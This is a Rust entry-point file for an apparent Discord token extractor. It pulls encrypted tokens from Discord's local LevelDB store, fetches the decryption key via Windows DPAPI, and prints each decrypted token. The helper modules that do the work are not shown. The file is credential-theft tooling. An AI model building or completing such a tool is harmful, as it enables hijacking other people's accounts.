mod tokens;
mod crypto;

use std::path::Path;
use anyhow::Result;

/// Main entry point: orchestrates token extraction and decryptions
fn main() -> Result<()> {

    let base_path = Path::new(r"C:\Users\<YourName>\AppData\Roaming\Discord");
    println!("[DEBUG] Starting token extraction for base path: {}", base_path.display());

    // Extract encrypted tokens from LevelDB
    let tokens = tokens::get_tokens(base_path)?;
    // Retrieve the AES key via DPAPI
    let key = crypto::get_key(base_path)?;

    println!("[DEBUG] Total tokens: {}", tokens.len());
    println!("[DEBUG] DPAPI key length: {}", key.len());

    // Decrypt each token and print
    for token in tokens {
        match crypto::decrypt_token(&token, &key) {
            Ok(decrypted) => println!("[TOKEN] {}", decrypted),
            Err(err) => println!("[TOKEN] Failed to decrypt token: {:?}", err),
        }
    }

    Ok(())
}
